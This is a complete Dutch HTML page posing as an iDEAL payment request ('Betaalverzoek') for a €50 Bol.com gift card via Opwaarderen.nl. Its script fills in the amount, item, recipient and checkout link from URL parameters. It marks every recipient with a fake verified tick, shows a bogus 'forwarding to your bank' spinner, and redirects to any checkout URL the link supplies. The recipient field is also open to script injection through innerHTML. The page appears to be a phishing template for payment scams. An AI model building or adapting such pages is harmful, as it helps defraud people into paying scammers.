<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Betaalverzoek</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
            background:linear-gradient(135deg,#f5f9ff 0%,#e8fff8 100%);
            display:flex;justify-content:center;align-items:center;min-height:100vh;color:#2d1b4e;}
        .card{max-width:380px;width:100%;background:white;border-radius:24px;
            box-shadow:0 20px 40px rgba(0,0,0,0.08);overflow:hidden;margin:20px 16px;}
        .header{background:linear-gradient(120deg,#a8e6cf,#d4a5ff);padding:32px 24px 40px;
            text-align:center;color:#2d1b4e;}
        .header h1{margin:0 0 8px;font-size:22px;font-weight:600;}
        .header p{margin:0;font-size:15px;opacity:0.9;}
        .content{padding:32px 28px;text-align:center;}
        .amount{font-size:56px;font-weight:800;
            background:linear-gradient(90deg,#55efc4,#a29bfe);
            -webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:0 0 12px;}
        .description{font-size:18px;color:#555;margin:0 0 28px;line-height:1.4;}
        .recipient{background:#f8f5ff;border:2px solid #e0d6ff;border-radius:16px;
            padding:20px;font-size:17px;margin:0 0 32px;}
        .recipient strong{color:#6c5ce7;font-weight:600;}
        .check{color:#00b894;font-weight:bold;margin-left:6px;}
        .pay-button{background:linear-gradient(90deg,#55efc4,#81ecec);color:#2d1b4e;
            font-size:18px;font-weight:700;padding:18px;border:none;border-radius:16px;
            width:100%;cursor:pointer;box-shadow:0 8px 20px rgba(85,239,196,0.3);
            text-decoration:none;display:block;transition:all .2s;}
        .pay-button:hover{transform:translateY(-2px);box-shadow:0 12px 28px rgba(85,239,196,0.4);}
        .footer{padding:24px;text-align:center;font-size:13px;color:#888;background:#f9f9ff;}
        .loading{display:none;margin-top:16px;color:#55efc4;font-size:15px;}
        .spinner{display:inline-block;width:16px;height:16px;border:2px solid #f3f3f3;
            border-top:2px solid #55efc4;border-radius:50%;animation:s 1s linear infinite;margin-right:8px;}
        @keyframes s{to{transform:rotate(360deg);}}
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <h1>Betaalverzoek</h1>
            <p>Veilig en snel geregeld</p>
        </div>
        <div class="content">
            <div class="amount" id="amount">€50,00</div>
            <div class="description" id="description">Bol.com cadeaukaart via Opwaarderen.nl</div>
            <div class="recipient">
                Ontvanger<br>
                <strong id="receiver">Fleur Jongkamp <span class="check">✓</span></strong>
            </div>
            <a href="#" class="pay-button" id="payBtn">Nu betalen met iDEAL</a>
            <div class="loading" id="loading">
                <div class="spinner"></div> Doorsturen naar je bank...
            </div>
        </div>
        <div class="footer">
            Veilig betalen • Geen extra kosten<br>
            <small>Betaling verwerkt door de gekozen aanbieder</small>
        </div>
    </div>

    <script>
        const p = new URLSearchParams(window.location.search);
        const article  = p.get('article')  || 'Bol.com cadeaukaart';
        const merchant = p.get('merchant') || 'Opwaarderen.nl';
        const price    = p.get('price')    || '50';
        const receiver = p.get('receiver') || 'Fleur Jongkamp';
        const checkout = p.get('checkout') || 'https://checkout.buckaroo.nl/html/redirect.ashx?r=FC1C0F88DAC24D9FBBE1DE96414DB6BB';

        document.getElementById('amount').textContent = '€' + parseFloat(price).toFixed(2).replace('.',',');
        document.getElementById('description').textContent = article + ' via ' + merchant;
        document.getElementById('receiver').innerHTML = receiver + ' <span class="check">✓</span>';

        const btn = document.getElementById('payBtn');
        btn.href = checkout;

        btn.addEventListener('click', function(e) {
            e.preventDefault();
            document.getElementById('loading').style.display = 'block';
            btn.style.display = 'none';
            setTimeout(() => { window.location.href = checkout; }, 1200);
        });
    </script>
</body>
</html>
